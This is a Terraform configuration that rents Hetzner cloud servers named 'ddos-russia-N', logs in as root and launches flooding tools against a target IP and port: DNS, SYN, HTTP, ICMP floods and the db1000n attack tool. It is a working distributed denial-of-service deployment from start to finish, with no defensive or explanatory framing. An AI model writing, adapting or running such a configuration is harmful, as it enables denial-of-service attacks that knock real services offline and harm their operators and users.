terraform {
  required_providers {
    hcloud = {
      source  = "hetznercloud/hcloud"
      version = "1.33.1"
    }
  }
}

provider "hcloud" {
  token = var.hcloud_token
}


data "hcloud_ssh_key" "admin" {
  name = "vang@nbook"
}


resource "hcloud_server" "ddos_server" {
  count       = var.instances_count
  name        = "ddos-russia-${count.index}"
  image       = var.server_image
  location    = var.location
  server_type = var.server_type
  ssh_keys    = [data.hcloud_ssh_key.admin.id]
}

locals {
  private_ssh_key = var.private_key_pem
}

resource "null_resource" "setup" {
  count = var.instances_count
  triggers = {
    minecraft_version = hcloud_server.ddos_server[count.index].id
  }

  connection {
    host        = hcloud_server.ddos_server[count.index].ipv4_address
    type        = "ssh"
    user        = "root"
    private_key = local.private_ssh_key
  }

  provisioner "remote-exec" {
    inline = [
      "set -e",
      "apt update",
      "apt upgrade -y",
    ]
  }

  depends_on = [
    hcloud_server.ddos_server,
  ]
}

resource "null_resource" "run_dnsflood" {
  count = var.dnsflood ? var.instances_count : 0
  triggers = {
    host_ip_addr    = hcloud_server.ddos_server[count.index].ipv4_address
    ip_addr         = var.ip_addr
    ip_port         = var.ip_port
    private_ssh_key = local.private_ssh_key
  }
  connection {
    host        = self.triggers.host_ip_addr
    private_key = self.triggers.private_ssh_key
  }

  provisioner "file" {
    source      = "./templates/dnsflood"
    destination = "/opt/dnsflood"
  }

  provisioner "remote-exec" {
    inline = [
      "set -e",
      "chmod +x /opt/dnsflood",
      "bash -c 'screen ls | grep dnsflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
      "screen -dmS dnsflood /opt/dnsflood A ${var.ip_addr} -p ${var.ip_port}",
      "sleep 1",
    ]
  }

  provisioner "remote-exec" {
    when = destroy
    inline = [
      "set -e",
      "bash -c 'screen -ls | grep dnsflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
    ]
  }

  depends_on = [
    null_resource.setup,
  ]
}


resource "null_resource" "run_synflood" {
  count = var.synflood ? var.instances_count : 0
  triggers = {
    host_ip_addr    = hcloud_server.ddos_server[count.index].ipv4_address
    ip_addr         = var.ip_addr
    ip_port         = var.ip_port
    private_ssh_key = local.private_ssh_key
  }
  connection {
    host        = self.triggers.host_ip_addr
    private_key = self.triggers.private_ssh_key
  }

  provisioner "file" {
    source      = "./templates/synflood"
    destination = "/opt/synflood"
  }

  provisioner "remote-exec" {
    inline = [
      "set -e",
      "chmod +x /opt/synflood",
      "bash -c 'screen -ls | grep synflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
      "screen -dmS synflood /opt/synflood ${var.ip_addr} ${var.ip_port}",
      "sleep 1",
    ]
  }

  provisioner "remote-exec" {
    when = destroy
    inline = [
      "set -e",
      "bash -c 'screen -ls | grep synflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
    ]
  }

  depends_on = [
    null_resource.setup,
  ]
}


resource "null_resource" "run_httpflood" {
  count = var.httpflood ? var.instances_count : 0
  triggers = {
    host_ip_addr    = hcloud_server.ddos_server[count.index].ipv4_address
    ip_addr         = var.ip_addr
    ip_port         = var.ip_port
    private_ssh_key = local.private_ssh_key
  }
  connection {
    host        = self.triggers.host_ip_addr
    private_key = self.triggers.private_ssh_key
  }

  provisioner "file" {
    source      = "./templates/inundator"
    destination = "/opt/inundator"
  }

  provisioner "remote-exec" {
    inline = [
      "set -e",
      "chmod +x /opt/inundator",
      "bash -c 'screen -ls | grep httpflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
      "screen -dmS httpflood /opt/inundator -c 1000 -H 'Connection: keep-alive' http://${var.ip_addr}:${var.ip_port}/",
      "sleep 1",
    ]
  }

  provisioner "remote-exec" {
    when = destroy
    inline = [
      "set -e",
      "bash -c 'screen -ls | grep httpflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
    ]
  }

  depends_on = [
    null_resource.setup,
  ]
}


resource "null_resource" "run_icmpflood" {
  count = var.icmpflood ? var.instances_count : 0
  triggers = {
    host_ip_addr    = hcloud_server.ddos_server[count.index].ipv4_address
    ip_addr         = var.ip_addr
    ip_port         = var.ip_port
    private_ssh_key = local.private_ssh_key
    restart         = 1
  }
  connection {
    host        = self.triggers.host_ip_addr
    private_key = self.triggers.private_ssh_key
  }

  provisioner "file" {
    source      = "./templates/icmp"
    destination = "/opt/icmp"
  }

  provisioner "remote-exec" {
    inline = [
      "set -e",
      "chmod +x /opt/icmp",
      "bash -c 'screen -ls | grep icmpflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
      "screen -dmS icmpflood /opt/icmp ${var.ip_addr}",
      "sleep 1",
    ]
  }

  provisioner "remote-exec" {
    when = destroy
    inline = [
      "set -e",
      "bash -c 'screen -ls | grep icmpflood | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
    ]
  }

  depends_on = [
    null_resource.setup,
  ]
}

resource "null_resource" "run_db1000n" {
  count = var.db1000n ? var.instances_count : 0
  triggers = {
    host_ip_addr    = hcloud_server.ddos_server[count.index].ipv4_address
    ip_addr         = var.ip_addr
    ip_port         = var.ip_port
    private_ssh_key = local.private_ssh_key
    restart         = 1
  }
  connection {
    host        = self.triggers.host_ip_addr
    private_key = self.triggers.private_ssh_key
  }

  provisioner "file" {
    source      = "./templates/db1000n"
    destination = "/opt/db1000n"
  }

  provisioner "remote-exec" {
    inline = [
      "set -e",
      "chmod +x /opt/db1000n",
      "bash -c 'screen -ls | grep db1000n | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
      "screen -dmS db1000n /opt/db1000n",
      "sleep 1",
    ]
  }

  provisioner "remote-exec" {
    when = destroy
    inline = [
      "set -e",
      "bash -c 'screen -ls | grep db1000n | cut -d. -f1 | xargs | xargs --no-run-if-empty kill'",
    ]
  }

  depends_on = [
    null_resource.setup,
  ]
}
